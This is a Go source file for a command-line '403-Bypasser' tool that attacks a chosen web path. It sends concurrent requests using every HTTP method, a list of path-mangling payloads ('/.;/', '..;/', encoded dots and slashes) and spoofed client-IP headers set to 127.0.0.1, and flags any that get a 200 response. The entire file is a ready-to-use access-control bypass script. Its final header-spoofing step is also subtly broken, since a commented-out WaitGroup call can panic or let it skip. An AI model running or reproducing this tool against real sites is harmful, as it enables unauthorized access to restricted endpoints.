package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net/http"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	reURL          = regexp.MustCompile("^https?://")
	headerPayloads = []string{
		"X-Custom-IP-Authorization",
		"X-Originating-IP",
		"X-Forwarded-For",
		"X-Remote-IP",
		"X-Client-IP",
		"X-Host",
		"X-Forwarded-Host",
		"X-ProxyUser-Ip",
		"X-Remote-Addr",
	}
	Red   = Color("\033[1;31m%s\033[0m")
	Green = Color("\033[1;32m%s\033[0m")
	Blue  = Color("\033[1;34m%s\033[0m")
	Cyan  = Color("\033[1;36m%s\033[0m")
)

const (
	version string = "v1.1.1"
	red     string = "\033[31m"
	green   string = "\033[32m"
	white   string = "\033[97m"

	headerValue string = "127.0.0.1"
)

func Color(colorString string) func(...interface{}) string {
	sprint := func(args ...interface{}) string {
		return fmt.Sprintf(colorString,
			fmt.Sprint(args...))
	}
	return sprint
}

func showBanner() {
	fmt.Println(Green(
		" _  _    ___ ____        ____\n",
		"| || |  / _ \\___ \\      |  _ \\\n",
		"| || |_| | | |__) |_____| |_) |_   _ _ __   __ _ ___ ___  ___ _ __\n",
		"|__   _| | | |__ <______|  _ <| | | | '_ \\ / _` / __/ __|/ _ \\ '__|\n",
		"   | | | |_| |__) |     | |_) | |_| | |_) | (_| \\__ \\__ \\  __/ |\n",
		"   |_|  \\___/____/      |____/ \\__, | .__/ \\__,_|___/___/\\___|_|\n",
		"                                __/ | |\n",
		"                               |___/|_|                          ",
		version))
}

func getValidDomain(domain string) string {
	trimmedDomain := strings.TrimSpace(domain)

	if !reURL.MatchString(trimmedDomain) {
		trimmedDomain = "https://" + trimmedDomain
	}

	return trimmedDomain
}

func constructEndpointPayloads(domain, path string) []string {
	return []string{
		domain + "/" + strings.ToUpper(path),
		domain + "/" + path + "/",
		domain + "/" + path + "/.",
		domain + "//" + path + "//",
		domain + "/./" + path + "/./",
		domain + "/./" + path + "/..",
		domain + "/;/" + path,
		domain + "/.;/" + path,
		domain + "//;//" + path,
		domain + "/" + path + "..;/",
		domain + "/%2e/" + path,
		domain + "/%252e/" + path,
		domain + "/%ef%bc%8f" + path,
	}
}

func penetrateEndpoint(wg *sync.WaitGroup, httpmethod string, _url string, header []string) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, httpmethod, _url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")

	var h string
	if header != nil {
		for _, e := range header {
			req.Header.Set(e, headerValue)
		}
	}

	resp, err := http.DefaultClient.Do(req)

	if err != nil {
		log.Println(Red(h, " ", _url, " ", httpmethod, " ERROR", " (", " ", ")"))
		return
	}

	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		log.Println(Red(h, " ", _url, " ", httpmethod, " ", " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
	} else {
		log.Println(Green(h, " ", _url, " ", httpmethod, " ", " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
	}

}

func main() {

	runtime.GOMAXPROCS(1)

	domain := flag.String("u", "", "A domain with the protocol. Example: https://daffa.tech")
	path := flag.String("p", "", "An endpoint. Example: admin")
	flag.Parse()

	if *domain == "" || *path == "" {
		log.Fatalln("Using flag -url and -path")
	}
	httpmethods := [...]string{"HEAD", "POST", "PUT", "PATCH", "DELETE", "CONNECT", "OPTIONS", "TRACE"}

	validDomain := getValidDomain(*domain)
	validPath := strings.TrimSpace(*path)
	endpoints := constructEndpointPayloads(validDomain, validPath)

	showBanner()

	fmt.Println(Blue("\nDomain:", validDomain))
	fmt.Println(Blue("Path:", validPath))

	fmt.Println(Cyan("\nNormal Request"))

	var wg sync.WaitGroup
	wg.Add(len(httpmethods))
	for _, httpmethod := range httpmethods {
		go penetrateEndpoint(&wg, httpmethod, validDomain+"/"+validPath, nil)
	}
	wg.Wait()

	wg.Add(len(endpoints))
	for _, e := range endpoints {
		go penetrateEndpoint(&wg, http.MethodGet, e, nil)
	}

	wg.Wait()

	fmt.Println(Cyan("\nRequest with Headers"))
	// wg.Add(1)

	go penetrateEndpoint(&wg, http.MethodGet, validDomain+"/"+validPath, headerPayloads)

	// wg.Wait()
}
